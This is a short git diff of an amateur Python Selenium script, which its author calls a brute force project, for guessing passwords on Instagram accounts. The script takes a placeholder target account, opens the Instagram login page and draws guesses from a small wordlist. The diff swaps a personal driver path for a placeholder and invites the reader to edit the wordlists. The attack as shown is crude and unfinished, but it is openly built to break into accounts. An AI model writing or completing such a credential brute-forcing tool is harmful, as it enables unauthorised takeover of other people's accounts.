@@ -4,12 +4,13 @@ from selenium.webdriver.common.keys import Keys
 import time
 
 # my first brute force project
+# MODIFY THE WORLISTS AND ARRAY TO YOUR LIKING
 
 def Brutalisk():
     global randForce
-    array = [1,2,3,]
+    array = [1,2,3]
     
-    words = ["password","","",""]
+    words = ["password",""]
 
     
     randArray = random.choice(array)
@@ -18,10 +19,11 @@ def Brutalisk():
     
 # What does this block do?
 # loads target to brute force 
+
 def BruteForce():
     global driver
     target = "ENTER_YOUR_TARGET_HERE"
-    driver = webdriver.Chrome(r'C:\Users\natha\Documents\chromedriver_win32\chromedriver.exe')
+    driver = webdriver.Chrome('WEBDRIVER_PATH')
     driver.get("https://www.instagram.com/")
     login_button = driver.find_element_by_xpath("//a[@href='/accounts/login/?source=auth_switcher']")
     login_button.click()
